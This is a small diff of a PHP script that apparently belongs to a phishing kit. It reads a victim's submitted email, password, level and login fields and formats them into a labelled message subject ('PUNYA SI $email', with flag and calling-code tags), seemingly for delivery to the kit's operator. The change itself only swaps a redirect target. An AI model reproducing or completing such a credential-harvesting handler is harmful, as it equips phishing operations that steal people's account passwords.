@@ -12,7 +12,7 @@ $level = $_POST['level'];
 $login = $_POST['login'];
 
 if($email == "" && $password == "" && $login == ""){
-header("Location: index.php");
+header("Location: index.html");
 }else{
 
 $subjek = "$arpantek_flag | $arpantek_callingcode | LEVEL $level | PUNYA SI $email | LOGIN $login";
